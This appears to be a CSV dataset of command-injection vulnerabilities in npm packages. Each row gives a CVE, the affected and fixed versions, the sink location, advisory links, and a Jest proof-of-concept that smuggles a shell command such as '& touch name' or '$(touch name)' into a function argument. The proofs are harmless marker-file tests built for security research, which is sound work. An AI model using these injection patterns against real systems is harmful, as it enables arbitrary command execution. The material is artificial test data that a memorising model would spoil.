Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
command-injection,CVE-2020-28425,curljs,0.1.2,n/a,command-injection/curljs_0.1.2,"test(""Command Injection in curljs"", (done) => {
  expect.assertions(2);
  const a = require(""curljs"");
  const fs = require(""fs"");
  const path = ""./curljs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""' & touch curljs # '"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,index.js:37:12,https://security.snyk.io/vuln/SNYK-JS-CURLJS-1050404; 
command-injection,,gity,1.0.5,n/a,command-injection/gity_1.0.5,"test(""Remote code execution in gity"", (done) => {
  expect.assertions(2);
  const Git = require(""gity"");
  const fs = require(""fs"");
  const path = ""./gity"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let git = Git()
      .add(""*.js"")
      .commit('-m ""added js files"";touch gity;#')
      .run(() => {
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);
        fs.unlink(path, function (err) {
          done();
        });
      });
  } catch (error) {}
});
",n/a,lib/index.js:90:7,https://security.snyk.io/vuln/SNYK-JS-GITY-1012730; 
command-injection,CVE-2020-8132,pdf-image,2.0.0,n/a,command-injection/pdf-image_2.0.0,"test(""Remote code execution in pdf-image"", () => {
  expect.assertions(2);
  var PDFImage = require(""pdf-image"").PDFImage;
  const fs = require(""fs"");
  const path = ""./pdf-image_2"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let pdfImage = new PDFImage('""; touch pdf-image_2 #""');
    return pdfImage.getInfo().finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
",n/a,index.js:44:7,https://security.snyk.io/vuln/SNYK-JS-PDFIMAGE-551984; https://github.com/advisories/GHSA-rv7p-mmwq-x674
command-injection,CVE-2021-24033,react-dev-utils,11.0.0,11.0.4,command-injection/react-dev-utils_11.0.0,"test(""Command Injection in react-dev-utils"", () => {
  expect.assertions(2);
  const getProcessForPort = require(""react-dev-utils/getProcessForPort"");
  const fs = require(""fs"");
  const path = ""./react-dev-utils"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  getProcessForPort(""11;$(touch react-dev-utils)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,getProcessForPort.js:28:10,https://security.snyk.io/vuln/SNYK-JS-REACTDEVUTILS-1083268; https://github.com/advisories/GHSA-5q6m-3h65-w53x
command-injection,CVE-2021-26543,git-parse,1.0.4,1.0.5,command-injection/git-parse_1.0.4,"test(""Command Injection in git-parse"", () => {
  expect.assertions(2);
  const x = require(""git-parse"");
  const fs = require(""fs"");
  const path = ""./git-parse"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const paths = "". || touch git-parse"";
  return x.gitDiff(""."", 445454, 1545, paths).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,src/git_diff.js:13:3,https://security.snyk.io/vuln/SNYK-JS-GITPARSE-1290380; 
command-injection,CVE-2021-23375,psnode,0.0.1,n/a,command-injection/psnode_0.0.1,"test(""Command Injection in psnode"", (done) => {
  expect.assertions(2);
  const psnode = require(""psnode"");
  const fs = require(""fs"");
  const path = ""./psnode"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  psnode.kill(""$(touch psnode)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  });
});
",n/a,lib/index.js:59:16,https://security.snyk.io/vuln/SNYK-JS-PSNODE-1078543; https://github.com/advisories/GHSA-m8fm-mv5w-33pv
command-injection,CVE-2019-10807,blamer,0.1.13,1.0.1,command-injection/blamer_0.1.13,"test(""Command Injection in blamer"", async () => {
  expect.assertions(2);
  const Root = require(""blamer"");
  const fs = require(""fs"");
  const path = ""./blamer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_command = ""& touch blamer &"";
  root = new Root(""git"", attack_command);
  try {
    await root.blameByFile(""./"");
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c,src/vcs/git.js:24:5,https://security.snyk.io/vuln/SNYK-JS-BLAMER-559541; https://github.com/advisories/GHSA-7vm7-j8p7-h346
command-injection,CVE-2020-7786,macfromip,1.1.1,n/a,command-injection/macfromip_1.1.1,"test(""Command Injection in macfromip"", (done) => {
  expect.assertions(2);
  const a = require(""macfromip"");
  const fs = require(""fs"");
  const path = ""./macfromip"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.getMacInLinux(""& touch macfromip"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/bcamarneiro/macfromip/commit/1bbed8cd6f8299ad2e9d028e0ed0771340ab8391,macfromip.js:66:15,https://security.snyk.io/vuln/SNYK-JS-MACFROMIP-1048336; https://github.com/advisories/GHSA-vh8f-xw5v-8993
command-injection,,freespace,1.0.4,n/a,command-injection/freespace_1.0.4,"test(""Command Injection in freespace"", () => {
  expect.assertions(2);
  const freespace = require(""freespace"");
  const fs = require(""fs"");
  const path = ""./freespace"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return freespace.check(""/ ; touch freespace"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,index.js:51:16,https://security.snyk.io/vuln/SNYK-JS-FREESPACE-1018705; 
command-injection,CVE-2020-28434,gitblame,0.1.1,n/a,command-injection/gitblame_0.1.1,"test(""Command Injection in gitblame"", (done) => {
  expect.assertions(2);
  const a = require(""gitblame"");
  const fs = require(""fs"");
  const path = ""./gitblame"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""& touch gitblame"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/gitblame.js:15:3,https://security.snyk.io/vuln/SNYK-JS-GITBLAME-1050430; 
command-injection,CVE-2019-10802,giting,0.0.7,0.0.8,command-injection/giting_0.0.7,"test(""Command Injection in giting"", (done) => {
  expect.assertions(2);
  const Test = require(""giting"");
  const fs = require(""fs"");
  const path = ""./giting"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let injection_command = "";touch giting;"";
  test = new Test({ workDir: ""./"" });
  repo = {
    organization: ""./"",
    name: ""./"",
    branch: injection_command,
  };
  test.pull(repo, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0,lib/git.js:223:8,https://security.snyk.io/vuln/SNYK-JS-GITING-559008; https://github.com/advisories/GHSA-53xj-v576-3ch2
command-injection,CVE-2020-28445,npm-help,1.0.0,n/a,command-injection/npm-help_1.0.0,"test(""Command Injection in npm-help"", () => {
  expect.assertions(2);
  const root = require(""npm-help"");
  const fs = require(""fs"");
  const path = ""./npm-help"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var module = ""& touch npm-help"";
  root.latestVersion(module);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync(""./version"");
  fs.unlink(path, function (err) {});
});
",n/a,index.js:13:22,https://security.snyk.io/vuln/SNYK-JS-NPMHELP-1050983; 
command-injection,CVE-2014-9682,dns-sync,0.1.0,0.1.3,command-injection/dns-sync_0.1.0,"test(""Command Injection in dns-sync"", () => {
  expect.assertions(2);
  const dnsSync = require(""dns-sync"");
  const fs = require(""fs"");
  const path = ""./dns-sync"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  dnsSync.resolve(""$(touch dns-sync)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/skoranga/node-dns-sync/commit/d9abaae384b198db1095735ad9c1c73d7b890a0d,lib/dns-sync.js:21:26,https://security.snyk.io/vuln/npm:dns-sync:20141111; https://github.com/advisories/GHSA-q5pq-pgrv-fh89
command-injection,,arpping,2.0.0,3.0.0,command-injection/arpping_2.0.0,"test(""Remote code execution in arpping"", () => {
  expect.assertions(2);
  const Arpping = require(""arpping"");
  const fs = require(""fs"");
  const path = ""./arpping"";
  let arpping = new Arpping();
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return arpping
    .ping(["";touch arpping;""])
    .then(() => {})
    .catch((err) => console.log(err))
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/haf-decent/arpping/commit/0db06723f8c3c73a5cc0829c667d45cba25ca44d,index.js:120:13,https://security.snyk.io/vuln/SNYK-JS-ARPPING-1060047; 
command-injection,CVE-2020-7784,ts-process-promises,1.0.2,n/a,command-injection/ts-process-promises_1.0.2,"test(""Command Injection in ts-process-promises"", () => {
  expect.assertions(2);
  const a = require(""ts-process-promises"");
  const fs = require(""fs"");
  const path = ""./ts-process-promises"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return a.exec(""touch ts-process-promises"", {}).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,lib/process-promises.js:45:31,https://security.snyk.io/vuln/SNYK-JS-TSPROCESSPROMISES-1048334; https://github.com/advisories/GHSA-ww4j-c2rq-47q8
command-injection,CVE-2020-7630,git-add-remote,1.0.0,n/a,command-injection/git-add-remote_1.0.0,"test(""Command Injection in git-add-remote"", (done) => {
  expect.assertions(2);
  const root = require(""git-add-remote"")();
  const fs = require(""fs"");
  const path = ""./git-add-remote"";
  let payload = ""& touch git-add-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(payload, """", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,index.js:21:8,https://security.snyk.io/vuln/SNYK-JS-GITADDREMOTE-564269; 
command-injection,CVE-2020-7631,diskusage-ng,0.2.6,1.0.0,command-injection/diskusage-ng_0.2.6,"test(""Command Injection in diskusage-ng"", (done) => {
  expect.assertions(2);
  const root = require(""diskusage-ng"");
  const fs = require(""fs"");
  const path = ""./diskusage-ng"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(['""&touch diskusage-ng""'], () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",https://github.com/iximiuz/node-diskusage-ng/commit/48e7e093486b528f0c81ec699573e0e4a431b8d3#diff-38182cfe286a150ebcc88df0ec57ed66,lib/posix.js:11:5,https://security.snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425; https://github.com/advisories/GHSA-3269-x4pw-vffg
command-injection,CVE-2020-7781,connection-tester,0.2.0,0.2.1,command-injection/connection-tester_0.2.0,"test(""Command Injection in connection-tester"", () => {
  expect.assertions(2);
  const a = require(""connection-tester"");
  const fs = require(""fs"");
  const path = ""./connection-tester"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.test(""& touch connection-tester"", 123, 1000);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync(path);
  fs.unlinkSync(""1000"");
  fs.unlinkSync(""123"");
});
",n/a,index.js:15:28,https://security.snyk.io/vuln/SNYK-JS-CONNECTIONTESTER-1048337; https://github.com/advisories/GHSA-w5mp-8p8w-mhh8
command-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,command-injection/hot-formula-parser_3.0.0,"test(""Command Injection in hot-formula-parser"", () => {
  expect.assertions(2);
  const FormulaParser = require(""hot-formula-parser"").Parser;
  const fs = require(""fs"");
  const path = ""./hot-formula-parser"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let parser = new FormulaParser();
  parser.parse(
    ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
  );
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
command-injection,CVE-2021-23380,roar-pidusage,1.1.6,n/a,command-injection/roar-pidusage_1.1.6,"test(""Command Injection in roar-pidusage"", (done) => {
  expect.assertions(1);
  const os = require(""os"");
  os.platform = () => {
    return ""freebsd"";
  };
  const roar_pidusage = require(""roar-pidusage"");
  const fs = require(""fs"");
  const path = ""./roar-pidusage"";
  roar_pidusage.stat(""$(touch roar-pidusage)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/stats.js:103:5,https://security.snyk.io/vuln/SNYK-JS-ROARPIDUSAGE-1078528; https://github.com/advisories/GHSA-xfxf-qw26-hr33
command-injection,CVE-2018-16461,libnmap,0.4.11,0.4.16,command-injection/libnmap_0.4.11,"test(""Command Injection in libnmap"", (done) => {
  expect.assertions(2);
  const nmap = require(""libnmap"");
  const fs = require(""fs"");
  const path = ""./libnmap"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const opts = {
    range: [""scanme.nmap.org"", ""x.x.$(touch libnmap)""],
  };
  nmap.scan(opts, function (err, report) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/jas-/node-libnmap/commit/c235b24b0342e12a5dbf502f89daabe95883b6c8,lib/classes/tools.js:114:25,https://security.snyk.io/vuln/SNYK-JS-LIBNMAP-72551; https://github.com/advisories/GHSA-7g2w-6r25-2j7p
command-injection,CVE-2020-7636,git-tags-remote,1.0.2,n/a,command-injection/git-tags-remote_1.0.2,"test(""Command Injection in git-tags-remote"", () => {
  expect.assertions(2);
  const gitTagsRemote = require(""git-tags-remote"");
  const fs = require(""fs"");
  const path = ""./git-tags-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return gitTagsRemote
    .get(
      ""https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test""
    )
    .finally((tags) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",n/a,index.js:5:2,https://security.snyk.io/vuln/SNYK-JS-GITTAGSREMOTE-596503; https://github.com/advisories/GHSA-4m6q-rxhm-675w
command-injection,,open,0.0.5,6.0.0,command-injection/open_0.0.5,"test(""Command Injection in open"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./open"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  require(""open"")('""""`touch open`');
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,lib/open.js:58:10,https://security.snyk.io/vuln/npm:open:20180512; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
